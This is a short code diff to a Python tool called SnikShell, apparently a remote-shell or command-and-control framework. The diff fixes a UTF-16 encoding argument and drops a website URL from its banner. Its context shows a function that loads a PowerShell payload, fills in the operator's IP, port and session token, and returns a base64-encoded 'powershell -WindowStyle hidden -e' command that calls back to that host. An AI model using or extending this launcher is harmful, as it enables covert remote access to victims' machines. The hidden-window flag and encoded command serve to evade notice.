@@ -118,7 +118,7 @@ class SnikShell():
 
     def generate_payload(self):
         payload = open("payload.ps1", "r").read().strip("\n").replace("*URI*", f"http://{self.ip}:{self.port}").replace("*AUTH*", self.session)
-        return "powershell -WindowStyle hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+        return "powershell -WindowStyle hidden -e " + base64.b64encode(payload.encode("utf-16")[2:]).decode()
 
     def show_banner(self):
         print(RED + """
@@ -129,7 +129,7 @@ class SnikShell():
   ╚════██║ ██║╚██╗██║ ██║ ██╔═██╗    ╚════██║ ██╔══██║ ██╔══╝   ██║      ██║     
   ███████║ ██║ ╚████║ ██║ ██║  ██╗   ███████║ ██║  ██║ ███████╗ ███████╗ ███████╗
   ╚══════╝ ╚═╝  ╚═══╝ ╚═╝ ╚═╝  ╚═╝   ╚══════╝ ╚═╝  ╚═╝ ╚══════╝ ╚══════╝ ╚══════╝         
-                          https://snikker.dev                                                  
+
         """ + END)
 
 shell = SnikShell()
